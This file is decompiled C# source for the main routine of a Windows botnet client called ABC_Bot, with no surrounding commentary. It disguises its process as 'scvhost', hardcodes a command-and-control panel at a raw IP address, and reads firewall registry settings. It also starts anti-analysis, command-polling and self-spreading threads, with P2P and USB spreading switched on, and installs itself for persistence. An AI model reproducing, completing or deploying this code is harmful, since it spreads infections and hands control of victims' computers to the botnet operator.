using System;
using System.Diagnostics;
using System.Threading;
using ABC_Bot.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;

namespace ABC_Bot;

[StandardModule]
internal sealed class main
{
	public static object windir = Environment.GetFolderPath(Environment.SpecialFolder.System);

	public static string name = "scvhost";

	public static string dir = Conversions.ToString(windir);

	public static string panel = "http://92.241.190.78:81/_02382/bot.php";

	public static int intervall = 20;

	public static bool o_p2p = true;

	public static bool o_usb = true;

	public static bool o_rar = false;

	public static bool http = true;

	public static bool supersyn = true;

	public static bool debug = false;

	private static RegistryKey RegKey;

	private static byte Ret_V;

	[STAThread]
	public static void main()
	{
		//IL_0086: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		Thread thread = default(Thread);
		Thread thread2 = default(Thread);
		Thread thread3 = default(Thread);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 432:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0000;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0013;
						case 4:
						case 5:
							goto IL_001c;
						case 6:
							goto IL_0029;
						case 7:
							goto IL_004c;
						case 8:
							goto IL_0055;
						case 9:
							goto IL_0062;
						case 10:
							goto IL_0070;
						case 11:
							goto IL_007b;
						case 12:
						case 13:
							goto IL_008c;
						case 14:
						case 15:
						case 16:
							goto IL_00a4;
						case 17:
							goto IL_00ba;
						case 18:
							goto IL_00c4;
						case 19:
							goto IL_00d2;
						case 20:
							goto IL_00e7;
						case 21:
						case 22:
							goto IL_00f1;
						case 23:
							goto IL_0107;
						case 24:
							goto IL_0111;
						case 25:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 26:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0107:
					num = 23;
					thread.Start();
					goto IL_0111;
					IL_00f1:
					num = 22;
					thread = new Thread((ThreadStart)delegate
					{
						c_cmd.intvall();
					});
					goto IL_0107;
					IL_0009:
					num = 2;
					if (debug)
					{
						goto IL_0013;
					}
					goto IL_001c;
					IL_0013:
					num = 3;
					mod_install.uninstall();
					goto IL_001c;
					IL_001c:
					num = 5;
					Thread.Sleep(2000);
					goto IL_0029;
					IL_0029:
					num = 6;
					Conversions.ToString(((ServerComputer)MyProject.Computer).get_Registry().GetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy\\StandardProfile", "EnableFirewall", (object)null));
					goto IL_004c;
					IL_004c:
					num = 7;
					Ret_V = 0;
					goto IL_0055;
					IL_0055:
					num = 8;
					RegKey.Flush();
					goto IL_0062;
					IL_0062:
					num = 9;
					RegKey.Close();
					goto IL_0070;
					IL_0070:
					num = 10;
					if (debug)
					{
						goto IL_007b;
					}
					goto IL_008c;
					IL_007b:
					num = 11;
					Interaction.MsgBox((object)"Start", (MsgBoxStyle)0, (object)null);
					goto IL_008c;
					IL_008c:
					num = 13;
					if (Process.GetProcessesByName(name).Length >= 2)
					{
						ProjectData.EndApp();
					}
					goto IL_00a4;
					IL_0111:
					num = 24;
					thread2 = new Thread((ThreadStart)delegate
					{
						c_smain.startspread();
					});
					break;
					IL_00a4:
					num = 16;
					thread3 = new Thread((ThreadStart)delegate
					{
						c_anti.intervall();
					});
					goto IL_00ba;
					IL_00ba:
					num = 17;
					thread3.Start();
					goto IL_00c4;
					IL_00c4:
					num = 18;
					Thread.Sleep(500);
					goto IL_00d2;
					IL_00d2:
					num = 19;
					if (Conversions.ToBoolean(Operators.NotObject(mod_install.isInstalled())))
					{
						goto IL_00e7;
					}
					goto IL_00f1;
					IL_00e7:
					num = 20;
					mod_install.Install();
					goto IL_00f1;
					end_IL_0000_2:
					break;
				}
				num = 25;
				thread2.Start();
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 432;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
